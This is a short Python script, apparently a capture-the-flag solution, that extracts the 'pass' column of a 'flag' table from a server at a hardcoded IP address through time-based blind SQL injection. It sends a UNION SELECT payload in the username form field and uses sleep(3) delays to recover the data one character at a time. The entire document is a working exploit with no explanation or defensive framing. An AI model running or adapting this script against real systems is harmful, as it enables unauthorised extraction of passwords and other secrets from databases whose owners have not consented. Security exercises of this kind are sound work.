import requests
from string import digits,ascii_letters



headers={"Content-Type" : "application/x-www-form-urlencoded"}


url = "http://54.169.55.172:1001" 
pos = 1
exfil = ""
printable = "," + digits + ascii_letters + "!@#$%^&*()_+=-/><\\'\"" 
column = "pass"
table = "flag"
while(True):
    for i in printable:
        data = f'username=\'UNION SELECT IF(ascii(substring(group_concat({column}),{pos},1)) = {str(ord(i))},sleep(3),\'a\'),2,3,4 FROM {table} LIMIT 1,2-- -'
        r = requests.post(url=url,data=data,headers=headers)
        if r.elapsed.total_seconds() > 3:
            exfil += i
            pos += 1
            print(exfil)
            break
        if i == '"':
            exit()

